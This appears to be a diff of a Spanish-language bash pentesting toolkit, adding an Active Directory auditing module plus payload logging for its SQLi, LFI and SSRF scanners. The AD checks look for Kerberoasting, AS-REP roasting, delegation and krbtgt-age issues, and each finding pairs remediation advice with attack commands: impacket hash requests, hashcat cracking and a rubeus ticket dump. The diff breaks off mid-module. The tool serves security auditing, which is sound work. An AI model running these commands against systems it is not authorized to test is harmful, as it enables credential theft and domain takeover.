@@ -1,7 +1,7 @@
 #!/usr/bin/env bash
 #
 # ╔══════════════════════════════════════════════════════════════╗
-# ║   WriestTavo v2.0 :: by WRIΞSTTAV0                           ║
+# ║   WriestTavo v8.0 :: by WRIΞSTTAV0                           ║
 # ║   Bug Bounty | Pentesting | Análisis de Vulnerabilidades     ║
 # ║                                                              ║
 # ║   MÓDULOS:                                                   ║
@@ -35,7 +35,7 @@ REPORT_FILE=""
 FINDINGS=()
 
 # ════════════════════════════════════════════════════════════════
-# ESTADO INTELIGENTE v7.0 — RETROALIMENTACIÓN TOTAL
+# ESTADO INTELIGENTE v8.0 — RETROALIMENTACIÓN TOTAL
 # Cada módulo escribe aquí. Los siguientes leen y se adaptan.
 # ════════════════════════════════════════════════════════════════
 
@@ -91,6 +91,18 @@ INTEL_NIKTO_FINDINGS=""
 # ── Cloud ──
 INTEL_CLOUD_PROVIDER=""        # aws | gcp | azure | cloudflare | ""
 INTEL_BEHIND_CDN=false
+# ── Active Directory INTEL ────────────────────────────────────
+INTEL_AD_DOMAIN=""
+INTEL_AD_DC=""
+INTEL_AD_USERS=()
+INTEL_AD_ADMINS=()
+INTEL_AD_KERBEROASTABLE=()
+INTEL_AD_ASREP_USERS=()
+INTEL_AD_PASSWORD_POLICY=""
+INTEL_AD_ADCS_FOUND=false
+INTEL_AD_LAPS_DEPLOYED=false
+INTEL_AD_NULL_SESSIONS=false
+INTEL_AD_CREDS=""
 INTEL_NVD_CVES=()           # CVEs de NVD para el stack
 INTEL_GHSA_VULNS=()         # GitHub Security Advisories
 INTEL_EDB_RESULTS=()        # Exploits EDB encontrados
@@ -99,6 +111,23 @@ INTEL_IDOR_FOUND=false          # true si se detectó IDOR potencial
 INTEL_OPEN_REDIRECT_FOUND=false # true si se confirmó open redirect
 INTEL_IIS_SHORTNAME=false       # true si IIS ShortName vulnerable
 INTEL_WEBDAV=false              # true si WebDAV habilitado
+# ── ADPulse ──────────────────────────────────────────────────────
+AD_DOMAIN=""
+AD_DOMAIN_FQDN=""
+AD_DC_IP=""
+AD_BASE_DN=""
+AD_USER=""
+AD_PASS=""
+AD_USER_FULL=""
+AD_OUT_DIR=""
+AD_CRITICAL=0; AD_HIGH=0; AD_MEDIUM=0; AD_LOW=0; AD_INFO=0
+AD_KERBEROASTABLE=()
+AD_ASREPROASTABLE=()
+AD_ADCS_TEMPLATES=()
+AD_UNCONSTRAINED=()
+AD_DA_MEMBERS=()
+AD_PASS_NEVER_EXPIRES=()
+AD_INACTIVE_ACCOUNTS=()
 
 intel_log() {
     echo -e "${C_PUR}  [INTEL]${C_RST} $1"
@@ -170,7 +199,7 @@ show_banner() {
     clear
     echo -e "${C_BLU}"
     echo "  ╔══════════════════════════════════════════════════════╗"
-    echo "  ║   WriestTavo v7.0  ::  WRIΞSTTAV0                    ║"
+    echo "  ║   WriestTavo v8.0  ::  WRIΞSTTAV0                    ║"
     echo "  ║   41 módulos · Stack Moderno · Auto-Update           ║"
     echo "  ║   Bug Bounty | Pentesting | CVE Feed | CTF           ║"
     echo "  ╚══════════════════════════════════════════════════════╝"
@@ -197,10 +226,10 @@ check_deps() {
     # Herramientas por categoría
     local web_tools=(whatweb nikto gobuster wafw00f nuclei ffuf dalfox commix arjun)
     local recon_tools=(subfinder theHarvester dnsrecon amass sslscan sslyze)
-    local exploit_tools=(searchsploit sqlmap wpscan crackmapexec enum4linux-ng smtp-user-enum snmpwalk)
+    local exploit_tools=(searchsploit sqlmap wpscan crackmapexec enum4linux-ng smtp-user-enum snmpwalk ldapsearch bloodhound-python)
     local optional_go=(dalfox arjun)
 
-    echo -e "${C_BLU}[*] Verificando dependencias v7.0...${C_RST}"
+    echo -e "${C_BLU}[*] Verificando dependencias v8.0...${C_RST}"
     for cmd in "${tools[@]}"; do
         command -v "$cmd" >/dev/null 2>&1 || missing+=("$cmd")
     done
@@ -246,7 +275,7 @@ preparar_directorio() {
 
 
 # ════════════════════════════════════════════════════════════════
-# SISTEMA DE AUTO-ACTUALIZACIÓN v7.0
+# SISTEMA DE AUTO-ACTUALIZACIÓN v8.0
 # ════════════════════════════════════════════════════════════════
 
 # ─── CONFIGURACIÓN DE ACTUALIZACIÓN ──────────────────────────────
@@ -1328,6 +1357,10 @@ modulo_sqli() {
     echo
     if (( vuln_count > 0 )); then
         INTEL_SQLI_FOUND=true
+        # Registrar payloads efectivos para los 3 reportes
+        for vuln_row in $(echo "$findings_detail" | grep -oP '(?<=<code>)[^<]+(?=</code>)'); do
+            register_payload "SQLi" "$vuln_row" "Ver sqli_results.txt" "Error/delay detectado"
+        done
         # Construir comando sqlmap inteligente basado en tecnología detectada
         local sqlmap_extra=""
         [[ "$db_type" == "mysql" ]]      && sqlmap_extra="--dbms=mysql"
@@ -2879,6 +2912,7 @@ modulo_lfi() {
                     ((found++))
 
                     INTEL_LFI_FOUND=true
+                    register_payload "LFI" "${lfi_payload}" "${lfi_url}" "Archivo leído: $(echo "$resp" | head -1)"
                     INTEL_LFI_PARAM="$param"
                     INTEL_LFI_URL="${test_url%=*}="
 
@@ -3021,6 +3055,7 @@ modulo_ssrf() {
                 ((found++))
 
                 INTEL_SSRF_FOUND=true
+                register_payload "SSRF" "${probe}" "${test_url}" "Respuesta interna detectada"
                 INTEL_SSRF_URL="${test_url%=*}="
 
                 add_finding "CRÍTICO" \
@@ -3288,7 +3323,7 @@ _generate_cors_poc() {
     local poc_file="${OUTPUT_DIR}/web/cors_poc.html"
     cat > "$poc_file" << POCEOF
 <!DOCTYPE html>
-<!-- WriestTavo v7.0 — CORS PoC automático -->
+<!-- WriestTavo v8.0 — CORS PoC automático -->
 <!-- Hostear en ${evil_origin} para ejecutar el ataque -->
 <html>
 <head><title>CORS PoC — ${target_url}</title></head>
@@ -4748,6 +4783,3714 @@ modulo_edb_search() {
 }
 
 
+
+# ════════════════════════════════════════════════════════════════
+# ██████╗ ██████╗ ██████╗ ██╗   ██╗██╗     ███████╗███████╗
+# ██╔══██╗██╔══██╗██╔══██╗██║   ██║██║     ██╔════╝██╔════╝
+# ███████║██║  ██║██████╔╝██║   ██║██║     ███████╗█████╗  
+# ██╔══██║██║  ██║██╔═══╝ ██║   ██║██║     ╚════██║██╔══╝  
+# ██║  ██║██████╔╝██║     ╚██████╔╝███████╗███████║███████╗
+# ╚═╝  ╚═╝╚═════╝ ╚═╝      ╚═════╝ ╚══════╝╚══════╝╚══════╝
+# ADPulse — Active Directory Security Auditor (integrado en WriestTavo)
+# 35 checks · LDAP solo lectura · Blue/Red Team · Pentesting Interno
+# ════════════════════════════════════════════════════════════════
+
+# ─── VARIABLES GLOBALES AD ──────────────────────────────────────
+AD_DOMAIN=""
+AD_DOMAIN_FQDN=""
+AD_DC_IP=""
+AD_BASE_DN=""
+AD_USER=""
+AD_PASS=""
+AD_USER_FULL=""
+AD_OUT_DIR=""
+AD_CRITICAL=0; AD_HIGH=0; AD_MEDIUM=0; AD_LOW=0; AD_INFO=0
+AD_KERBEROASTABLE=()
+AD_ASREPROASTABLE=()
+AD_ADCS_TEMPLATES=()
+AD_UNCONSTRAINED=()
+AD_DA_MEMBERS=()
+AD_PASS_NEVER_EXPIRES=()
+AD_INACTIVE_ACCOUNTS=()
+
+# ─── HELPERS INTERNOS ───────────────────────────────────────────
+_ad_finding() {
+    # _ad_finding SEVERIDAD TÍTULO DETALLE CVSS REMEDIACIÓN NEXT_STEP
+    local sev="$1" title="$2" detail="$3" cvss="${4:-N/A}"
+    local rem="${5:-}" next="${6:-}"
+    case "$sev" in
+        CRÍTICO) ((AD_CRITICAL++)) ;;
+        ALTO)    ((AD_HIGH++)) ;;
+        MEDIO)   ((AD_MEDIUM++)) ;;
+        BAJO)    ((AD_LOW++)) ;;
+        *)       ((AD_INFO++)) ;;
+    esac
+    add_finding "$sev" "🏢 AD: ${title}" "$detail" "$cvss" "$rem" "$next"
+}
+
+_ad_log() { echo -e "  ${C_PUR}[ADPulse]${C_RST} $*"; }
+_ad_ok()  { echo -e "  ${C_GRN}[✓]${C_RST} $*"; }
+_ad_warn(){ echo -e "  ${C_YEL}[!]${C_RST} $*"; }
+_ad_crit(){ echo -e "  ${C_RED}[💥]${C_RST} $*"; }
+
+# LDAP autenticado
+_ldap() {
+    local filter="$1" attrs="${2:-*}"
+    ldapsearch -x -LLL \
+        -H "ldap://${AD_DC_IP}:389" \
+        -D "${AD_USER_FULL}" \
+        -w "${AD_PASS}" \
+        -b "${AD_BASE_DN}" \
+        -E pr=1000/noprompt \
+        "$filter" $attrs 2>/dev/null
+}
+
+# LDAP por LDAPS (636)
+_ldaps() {
+    local filter="$1" attrs="${2:-*}"
+    ldapsearch -x -LLL \
+        -H "ldaps://${AD_DC_IP}:636" \
+        -D "${AD_USER_FULL}" \
+        -w "${AD_PASS}" \
+        -b "${AD_BASE_DN}" \
+        -E pr=1000/noprompt \
+        "$filter" $attrs 2>/dev/null
+}
+
+# LDAP anónimo (null bind — verifica si está habilitado)
+_ldap_anon() {
+    local filter="$1" attrs="${2:-*}"
+    ldapsearch -x -LLL \
+        -H "ldap://${AD_DC_IP}:389" \
+        -b "${AD_BASE_DN}" \
+        "$filter" $attrs 2>/dev/null
+}
+
+# Wrapper impacket (soporta .py o sin extensión según distro)
+_impacket() {
+    local tool="$1"; shift
+    local cmd=""
+    command -v "${tool}.py" >/dev/null 2>&1 && cmd="${tool}.py"
+    command -v "${tool}"    >/dev/null 2>&1 && [[ -z "$cmd" ]] && cmd="${tool}"
+    [[ -z "$cmd" ]] && { echo "NOTFOUND"; return 1; }
+    "$cmd" "$@" 2>/dev/null
+}
+
+# Convertir DN a FQDN: DC=corp,DC=local → corp.local
+_dn_to_fqdn() {
+    echo "$1" | grep -oP '(?<=DC=)[^,]+' | paste -sd '.' -
+}
+
+# ─── MÓDULO 45: ADPULSE — AUDITOR DE ACTIVE DIRECTORY ───────────
+modulo_adpulse() {
+    log "MÓDULO 45: ADPulse — Active Directory Security Auditor"
+    tip "Requiere: ldapsearch + credenciales de dominio de solo lectura. No modifica el AD."
+
+    # ── Verificar dependencias ───────────────────────────────────
+    local deps_ok=true
+    for dep in ldapsearch python3; do
+        command -v "$dep" >/dev/null 2>&1 || {
+            warn "Dependencia faltante: ${dep}"
+            deps_ok=false
+        }
+    done
+    if [[ "$deps_ok" == "false" ]]; then
+        warn "Instalar: sudo apt install ldap-utils python3"
+        return
+    fi
+
+    # ── Solicitar credenciales AD ────────────────────────────────
+    echo
+    echo -e "${C_PUR}  ╔════════════════════════════════════════════╗${C_RST}"
+    echo -e "${C_PUR}  ║  ADPulse — Configuración de Conexión AD    ║${C_RST}"
+    echo -e "${C_PUR}  ╚════════════════════════════════════════════╝${C_RST}"
+    echo
+    echo -e "  ${C_DIM}Requiere cuenta de solo lectura en el dominio.${C_RST}"
+    echo -e "  ${C_DIM}Ejemplo: ldapuser / ReadOnly123!${C_RST}"
+    echo
+
+    # DC IP (autodetectar si ya tenemos TARGET)
+    local default_dc="${TARGET}"
+    echo -ne "  ${C_YEL}IP del Domain Controller${C_RST} [${default_dc}]: "
+    read -r input_dc
+    AD_DC_IP="${input_dc:-$default_dc}"
+
+    echo -ne "  ${C_YEL}Dominio FQDN${C_RST} (ej: corp.local): "
+    read -r input_domain
+    AD_DOMAIN_FQDN=$(echo "${input_domain}" | tr '[:upper:]' '[:lower:]')
+    AD_DOMAIN=$(echo "${input_domain}" | tr '[:lower:]' '[:upper:]')
+
+    # Construir Base DN automáticamente
+    AD_BASE_DN=$(echo "$AD_DOMAIN_FQDN" | awk -F'.' '{for(i=1;i<=NF;i++) printf "DC="$i(i<NF?",":""); print ""}')
+    echo -e "  ${C_DIM}  Base DN detectado: ${AD_BASE_DN}${C_RST}"
+
+    echo -ne "  ${C_YEL}Usuario${C_RST} (solo nombre, ej: ldapuser): "
+    read -r input_user
+    AD_USER="$input_user"
+    AD_USER_FULL="${AD_DOMAIN}\\${AD_USER}"
+
+    echo -ne "  ${C_YEL}Contraseña${C_RST}: "
+    read -rs input_pass
+    AD_PASS="$input_pass"
+    echo
+
+    # Opción: null bind anónimo
+    echo -ne "  ${C_YEL}¿Probar también acceso anónimo (null bind)? [s/N]${C_RST}: "
+    read -r do_anon
+    local try_anon=false
+    [[ "${do_anon,,}" =~ ^(s|si|yes|y)$ ]] && try_anon=true
+
+    echo
+
+    # ── Preparar directorio de salida ────────────────────────────
+    AD_OUT_DIR="${OUTPUT_DIR}/active_directory"
+    mkdir -p "$AD_OUT_DIR"
+
+    echo "ADPulse Scan — $(date)" > "${AD_OUT_DIR}/adpulse_log.txt"
+    echo "DC: ${AD_DC_IP} | Domain: ${AD_DOMAIN_FQDN} | User: ${AD_USER}" >> "${AD_OUT_DIR}/adpulse_log.txt"
+    echo "─────────────────────────────────────────────────" >> "${AD_OUT_DIR}/adpulse_log.txt"
+
+    # ── Test de conectividad LDAP ────────────────────────────────
+    _ad_log "Probando conectividad LDAP con ${AD_DC_IP}:389..."
+    local test_conn
+    test_conn=$(ldapsearch -x -LLL \
+        -H "ldap://${AD_DC_IP}:389" \
+        -D "${AD_USER_FULL}" \
+        -w "${AD_PASS}" \
+        -b "${AD_BASE_DN}" \
+        "(objectClass=domain)" dc 2>&1 | head -5)
+
+    if echo "$test_conn" | grep -qi "result: 0\|dc:"; then
+        _ad_ok "Conexión LDAP exitosa → ${AD_DOMAIN_FQDN}"
+    elif echo "$test_conn" | grep -qi "invalid credentials\|49"; then
+        _ad_warn "Credenciales incorrectas (código 49). Continuar con lo que se pueda."
+    elif echo "$test_conn" | grep -qi "can't contact\|connection refused\|timed out"; then
+        warn "No se puede conectar a ${AD_DC_IP}:389. Verificar IP y que LDAP esté activo."
+        return
+    else
+        _ad_warn "Respuesta inesperada: ${test_conn:0:80}"
+    fi
+
+    echo
+    echo -e "${C_PUR}  ═══ Iniciando 35 checks de seguridad AD ═══${C_RST}"
+    echo
+
+    # ════════════════════════════════════════════════════════════
+    # CHECK 1: NULL BIND (acceso LDAP anónimo)
+    # ════════════════════════════════════════════════════════════
+    _ad_log "[01/35] Null Bind — Acceso LDAP anónimo"
+    local anon_result
+    anon_result=$(_ldap_anon "(objectClass=domain)" dc 2>&1 | head -5)
+    if echo "$anon_result" | grep -qi "dc:"; then
+        _ad_crit "Null bind HABILITADO — cualquiera puede enumerar el AD sin credenciales"
+        _ad_finding "CRÍTICO" "Null Bind LDAP Habilitado" \
+            "El servidor LDAP permite consultas anónimas sin autenticación. Un atacante puede enumerar usuarios, grupos, políticas y estructura del dominio sin ninguna credencial." \
+            "9.1" \
+            "Deshabilitar acceso anónimo LDAP: Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options → 'Network access: Allow anonymous SID/Name translation' = Disabled" \
+            "ldapsearch -x -LLL -H ldap://${AD_DC_IP} -b '${AD_BASE_DN}' '(objectClass=user)' cn"
+    else
+        _ad_ok "Null bind deshabilitado (correcto)"
+    fi
+
+    # ════════════════════════════════════════════════════════════
+    # CHECK 2: KERBEROASTING — SPNs en cuentas de usuario
+    # ════════════════════════════════════════════════════════════
+    _ad_log "[02/35] Kerberoasting — Cuentas con SPN"
+    local spn_file="${AD_OUT_DIR}/kerberoastable.txt"
+    local spn_data
+    spn_data=$(_ldap "(& (servicePrincipalName=*)(objectClass=user)(!(cn=krbtgt))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" \
+        "cn servicePrincipalName sAMAccountName userAccountControl pwdLastSet" 2>/dev/null)
+
+    echo "$spn_data" > "$spn_file"
+    local spn_count
+    spn_count=$(echo "$spn_data" | grep -c "^dn:" || echo 0)
+
+    if (( spn_count > 0 )); then
+        _ad_crit "Kerberoastable: ${spn_count} cuentas con SPN"
+        local spn_html="<table class='vuln-table'><tr><th>Usuario</th><th>SPN</th><th>PwdLastSet</th></tr>"
+        while IFS= read -r line; do
+            if [[ "$line" =~ ^sAMAccountName:\ (.+) ]]; then
+                local sam="${BASH_REMATCH[1]}"
+                AD_KERBEROASTABLE+=("$sam")
+            fi
+            if [[ "$line" =~ ^servicePrincipalName:\ (.+) ]]; then
+                spn_html+="<tr><td><b>${sam}</b></td><td>${BASH_REMATCH[1]}</td><td>—</td></tr>"
+            fi
+        done <<< "$spn_data"
+        spn_html+="</table>"
+        spn_html+="<br><b>Hashcat:</b> <code>hashcat -m 13100 kerberoast_hashes.txt rockyou.txt --force</code>"
+
+        _ad_finding "CRÍTICO" "Kerberoasting: ${spn_count} Cuentas con SPN" \
+            "${spn_html}" "9.0" \
+            "Usar contraseñas >25 caracteres aleatorias en cuentas de servicio. Migrar a Managed Service Accounts (MSA) o Group Managed Service Accounts (gMSA). Auditar SPNs innecesarios." \
+            "impacket-GetUserSPNs ${AD_DOMAIN_FQDN}/${AD_USER}:'${AD_PASS}' -dc-ip ${AD_DC_IP} -request -outputfile ${AD_OUT_DIR}/kerberoast.hashes"
+    else
+        _ad_ok "Sin cuentas Kerberoastables"
+    fi
+
+    # ════════════════════════════════════════════════════════════
+    # CHECK 3: AS-REP ROASTING — cuentas sin preautenticación
+    # ════════════════════════════════════════════════════════════
+    _ad_log "[03/35] AS-REP Roasting — Sin preautenticación Kerberos"
+    local asrep_data
+    asrep_data=$(_ldap "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
+        "cn sAMAccountName" 2>/dev/null)
+    local asrep_count
+    asrep_count=$(echo "$asrep_data" | grep -c "^dn:" || echo 0)
+
+    if (( asrep_count > 0 )); then
+        _ad_crit "AS-REP Roastable: ${asrep_count} cuentas sin preauth"
+        local asrep_html="<p>Cuentas con <b>DONT_REQUIRE_PREAUTH</b> habilitado:</p><ul>"
+        while IFS= read -r line; do
+            [[ "$line" =~ ^sAMAccountName:\ (.+) ]] && {
+                AD_ASREPROASTABLE+=("${BASH_REMATCH[1]}")
+                asrep_html+="<li><code>${BASH_REMATCH[1]}</code></li>"
+            }
+        done <<< "$asrep_data"
+        asrep_html+="</ul>"
+        asrep_html+="<b>Hashcat:</b> <code>hashcat -m 18200 asrep_hashes.txt rockyou.txt</code>"
+
+        _ad_finding "CRÍTICO" "AS-REP Roasting: ${asrep_count} Cuentas Vulnerables" \
+            "$asrep_html" "9.0" \
+            "Habilitar preautenticación Kerberos en todas las cuentas. Deshabilitar el atributo DONT_REQUIRE_PREAUTH a menos que sea estrictamente necesario." \
+            "impacket-GetNPUsers ${AD_DOMAIN_FQDN}/ -usersfile ${AD_OUT_DIR}/users.txt -format hashcat -outputfile ${AD_OUT_DIR}/asrep.hashes -dc-ip ${AD_DC_IP}"
+    else
+        _ad_ok "Sin cuentas AS-REP Roastables"
+    fi
+
+    # ════════════════════════════════════════════════════════════
+    # CHECK 4: UNCONSTRAINED DELEGATION
+    # ════════════════════════════════════════════════════════════
+    _ad_log "[04/35] Unconstrained Delegation"
+    local unconstrained_data
+    unconstrained_data=$(_ldap "(&(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(primaryGroupID=516))(!(primaryGroupID=521)))" \
+        "cn sAMAccountName distinguishedName" 2>/dev/null)
+    local unc_count
+    unc_count=$(echo "$unconstrained_data" | grep -c "^dn:" || echo 0)
+
+    if (( unc_count > 0 )); then
+        _ad_crit "Delegación sin restricción en ${unc_count} objeto(s)"
+        local unc_html="<p>Objetos con <b>TrustedForDelegation</b> (TRUSTED_FOR_DELEGATION):</p><ul>"
+        while IFS= read -r line; do
+            [[ "$line" =~ ^cn:\ (.+) ]] && {
+                AD_UNCONSTRAINED+=("${BASH_REMATCH[1]}")
+                unc_html+="<li><code>${BASH_REMATCH[1]}</code></li>"
+            }
+        done <<< "$unconstrained_data"
+        unc_html+="</ul><p><b>Impacto:</b> Si se compromete este equipo, se pueden robar tickets TGT de cualquier usuario que se autentique en él, incluyendo Domain Admins.</p>"
+
+        _ad_finding "CRÍTICO" "Unconstrained Delegation Habilitado" \
+            "$unc_html" "9.5" \
+            "Reemplazar con Constrained Delegation (msDS-AllowedToDelegateTo) o Resource-Based Constrained Delegation (RBCD). Nunca usar TrustedForDelegation excepto en DCs." \
+            "rubeus.exe dump /service:krbtgt /nowrap  # desde el equipo comprometido con delegación"
+    else
+        _ad_ok "Sin Unconstrained Delegation (excepto DCs)"
+    fi
+
+    # ════════════════════════════════════════════════════════════
+    # CHECK 5: CONSTRAINED DELEGATION con protocolo S4U2Self
+    # ════════════════════════════════════════════════════════════
+    _ad_log "[05/35] Constrained Delegation — S4U2Self/S4U2Proxy"
+    local constrained_data
+    constrained_data=$(_ldap "(msDS-AllowedToDelegateTo=*)" \
+        "cn sAMAccountName msDS-AllowedToDelegateTo userAccountControl" 2>/dev/null)
+    local con_count
+    con_count=$(echo "$constrained_data" | grep -c "^dn:" || echo 0)
+
+    if (( con_count > 0 )); then
+        _ad_warn "Constrained Delegation configurado en ${con_count} objeto(s)"
+        local con_html="<p>Objetos con Constrained Delegation (puede ser legítimo pero revisar):</p><ul>"
+        while IFS= read -r line; do
+            [[ "$line" =~ ^cn:\ (.+) ]] && con_html+="<li>${BASH_REMATCH[1]}</li>"
+            [[ "$line" =~ ^msDS-AllowedToDelegateTo:\ (.+) ]] && con_html+="<li style='color:#8b949e;font-size:12px;'>→ ${BASH_REMATCH[1]}</li>"
+        done <<< "$constrained_data"
+        con_html+="</ul>"
+
+        _ad_finding "MEDIO" "Constrained Delegation — Revisar Configuración" \
+            "$con_html" "6.5" \
+            "Revisar que los servicios configurados en msDS-AllowedToDelegateTo sean necesarios. Auditar si hay combinación con TRUSTED_TO_AUTH_FOR_DELEGATION (Protocol Transition)." \
+            "impacket-findDelegation ${AD_DOMAIN_FQDN}/${AD_USER}:'${AD_PASS}' -dc-ip ${AD_DC_IP}"
+    else
+        _ad_ok "Constrained Delegation: configuración limpia"
+    fi
+
+    # ════════════════════════════════════════════════════════════
+    # CHECK 6: CUENTAS DE DOMINIO ADMIN
+    # ════════════════════════════════════════════════════════════
+    _ad_log "[06/35] Miembros de grupos privilegiados"
+    local priv_groups=("Domain Admins" "Enterprise Admins" "Schema Admins" "Administrators" "Account Operators" "Backup Operators")
+    local priv_html="<table class='vuln-table'><tr><th>Grupo</th><th>Miembros</th></tr>"
+    local total_priv=0
+
+    for grp in "${priv_groups[@]}"; do
+        local grp_data
+        grp_data=$(_ldap "(&(objectClass=group)(cn=${grp}))" "member" 2>/dev/null)
+        local members
+        members=$(echo "$grp_data" | grep "^member:" | wc -l)
+        ((total_priv += members))
+        (( members > 0 )) && AD_DA_MEMBERS+=("${grp}: ${members} miembros")
+
+        local color="#c9d1d9"
+        [[ "$grp" == "Domain Admins" ]] && (( members > 5 )) && color="#ff6b35"
+        [[ "$grp" == "Schema Admins" || "$grp" == "Enterprise Admins" ]] && (( members > 0 )) && color="#ff2d2d"
+
+        priv_html+="<tr><td><b>${grp}</b></td><td style='color:${color};'>${members}</td></tr>"
+    done
+    priv_html+="</table>"
+    priv_html+="<br><b>Regla:</b> Domain Admins ≤ 5, Schema Admins = 0 en prod, Enterprise Admins = 0 en prod."
+
+    local priv_sev="INFO"
+    (( total_priv > 20 )) && priv_sev="MEDIO"
+    # Check if schema/enterprise admins have members
+    echo "${AD_DA_MEMBERS[@]}" | grep -qE "Schema Admins: [^0]|Enterprise Admins: [^0]" && priv_sev="ALTO"
+
+    _ad_finding "$priv_sev" "Grupos Privilegiados — ${total_priv} Miembros Totales" \
+        "$priv_html" "7.0" \
+        "Aplicar principio de mínimo privilegio. Domain Admins: máximo 5 cuentas. Schema/Enterprise Admins: vacíos en operación normal. Usar tier model (Tier 0/1/2)." \
+        "net group 'Domain Admins' /domain | Alternativa: bloodhound-python -u USER -p PASS -d DOMAIN -c All"
+
+    # ════════════════════════════════════════════════════════════
+    # CHECK 7: KRBTGT PASSWORD AGE (Golden Ticket prevention)
+    # ════════════════════════════════════════════════════════════
+    _ad_log "[07/35] KRBTGT — Edad de contraseña"
+    local krbtgt_data
+    krbtgt_data=$(_ldap "(cn=krbtgt)" "pwdLastSet whenCreated" 2>/dev/null)
+    local krbtgt_pwdset
+    krbtgt_pwdset=$(echo "$krbtgt_data" | grep "^pwdLastSet:" | awk '{print $2}')
+
+    if [[ -n "$krbtgt_pwdset" ]] && (( krbtgt_pwdset > 0 )); then
+        # Convertir Windows FileTime a Unix timestamp
+        local krbtgt_age_days
+        krbtgt_age_days=$(python3 -c "
+import datetime
+ft = ${krbtgt_pwdset}
+unix_ts = (ft - 116444736000000000) // 10000000
+dt = datetime.datetime.utcfromtimestamp(unix_ts)
+now = datetime.datetime.utcnow()
+print((now - dt).days)
+" 2>/dev/null || echo "999")
+
+        if (( krbtgt_age_days > 180 )); then
+            _ad_crit "KRBTGT password tiene ${krbtgt_age_days} días (>180) — Golden Ticket risk"
+            _ad_finding "CRÍTICO" "KRBTGT Password Antigua (${krbtgt_age_days} días)" \
+                "<p>La cuenta <b>krbtgt</b> no ha cambiado su contraseña en <b>${krbtgt_age_days} días</b>. Si esta contraseña fue comprometida (Golden Ticket), el atacante mantiene persistencia perpetua.</p>
+                <p><b>NIST recomienda:</b> Cambiar krbtgt cada 180 días máximo.</p>
+                <p><b>⚠ Procedimiento:</b> La contraseña debe cambiarse TWICE con intervalo de 10h entre cambios para invalidar todos los tickets.</p>" \
+                "9.8" \
+                "Cambiar contraseña krbtgt DOS VECES con 10 horas de intervalo usando Microsoft's New-KrbtgtKeys.ps1 script." \
+                "Invoke-ADServiceAccountPasswordReset -AccountName krbtgt | O usar: Reset-KrbtgtKeyInteractively.ps1"
+        elif (( krbtgt_age_days > 90 )); then
+            _ad_warn "KRBTGT: ${krbtgt_age_days} días (recomendado <90)"
+            _ad_finding "ALTO" "KRBTGT Password — ${krbtgt_age_days} días sin cambio" \
+                "<p>Recomendado cambiar cada 90 días para reducir ventana de Golden Ticket.</p>" \
+                "7.5" \
+                "Cambiar krbtgt password dos veces con intervalo de 10 horas." \
+                "New-KrbtgtKeys.ps1 -Mode ResetNow -Domain ${AD_DOMAIN_FQDN}"
+        else
+            _ad_ok "KRBTGT password: ${krbtgt_age_days} días (OK)"
+        fi
+    fi
+
+    # ════════════════════════════════════════════════════════════
+    # CHECK 8: CONTRASEÑAS QUE NUNCA EXPIRAN
+    # ════════════════════════════════════════════════════════════
+    _ad_log "[08/35] Cuentas con contraseñas que nunca expiran"
+    local noexp_data
+    noexp_data=$(_ldap "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" \
+        "cn sAMAccountName" 2>/dev/null)
+    local noexp_count
+    noexp_count=$(echo "$noexp_data" | grep -c "^dn:" || echo 0)
+
+    if (( noexp_count > 0 )); then
+        _ad_warn "${noexp_count} cuentas con DONT_EXPIRE_PASSWORD"
+        local noexp_html="<p><b>${noexp_count} cuentas</b> activas con contraseña configurada para no expirar nunca:</p><ul>"
+        while IFS= read -r line; do
+            [[ "$line" =~ ^sAMAccountName:\ (.+) ]] && {
+                AD_PASS_NEVER_EXPIRES+=("${BASH_REMATCH[1]}")
+                noexp_html+="<li><code>${BASH_REMATCH[1]}</code></li>"
+            }
+        done <<< "$noexp_data"
+        noexp_html+="</ul>"
+
+        local ne_sev="BAJO"
+        (( noexp_count > 50 )) && ne_sev="MEDIO"
+        (( noexp_count > 200 )) && ne_sev="ALTO"
+
+        _ad_finding "$ne_sev" "Contraseñas Sin Expiración — ${noexp_count} Cuentas" \
+            "$noexp_html" "5.0" \
+            "Aplicar política de expiración de contraseñas. Cuentas de servicio → usar gMSA. Usuarios → máximo 90-180 días según política." \
+            "Get-ADUser -Filter {PasswordNeverExpires -eq \$true -and Enabled -eq \$true} | Select Name"
+    else
+        _ad_ok "Sin cuentas con contraseñas sin expiración"
+    fi
+
+    # ════════════════════════════════════════════════════════════
+    # CHECK 9: CUENTAS INACTIVAS CON ACCESO
+    # ════════════════════════════════════════════════════════════
+    _ad_log "[09/35] Cuentas inactivas (sin logon >90 días)"
+    local inactive_data
+    # Calcular timestamp de 90 días atrás en formato LDAP
+    local ninety_days_ago
+    ninety_days_ago=$(python3 -c "
+import datetime
+dt = datetime.datetime.utcnow() - datetime.timedelta(days=90)
+# Windows FileTime
+ft = int(dt.timestamp()) * 10000000 + 116444736000000000
+print(ft)
+" 2>/dev/null || echo "0")
+
+    if (( ninety_days_ago > 0 )); then
+        inactive_data=$(_ldap "(&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(lastLogonTimestamp<=${ninety_days_ago})(lastLogonTimestamp>=1))" \
+            "cn sAMAccountName lastLogonTimestamp" 2>/dev/null)
+        local inactive_count
+        inactive_count=$(echo "$inactive_data" | grep -c "^dn:" || echo 0)
+
+        if (( inactive_count > 0 )); then
+            _ad_warn "${inactive_count} cuentas activas sin logon en 90+ días"
+            _ad_finding "MEDIO" "Cuentas Inactivas Activas — ${inactive_count} Usuarios" \
+                "<p><b>${inactive_count} cuentas habilitadas</b> sin inicio de sesión en más de 90 días. Son vectores de ataque ideales: nadie notará el uso.</p>
+                <p>Exportado en: <code>${AD_OUT_DIR}/inactive_accounts.txt</code></p>" \
+                "5.0" \
+                "Deshabilitar cuentas inactivas >90 días. Implementar proceso de revisión de identidades trimestral (IAM lifecycle)." \
+                "Search-ADAccount -AccountInactive -TimeSpan 90.00:00:00 -UsersOnly | Disable-ADAccount"
+            echo "$inactive_data" > "${AD_OUT_DIR}/inactive_accounts.txt"
+        else
+            _ad_ok "Sin cuentas inactivas relevantes"
+        fi
+    fi
+
+    # ════════════════════════════════════════════════════════════
+    # CHECK 10: POLÍTICA DE CONTRASEÑAS DEL DOMINIO
+    # ════════════════════════════════════════════════════════════
+    _ad_log "[10/35] Política de contraseñas del dominio"
+    local pso_data
+    pso_data=$(_ldap "(objectClass=domainDNS)" \
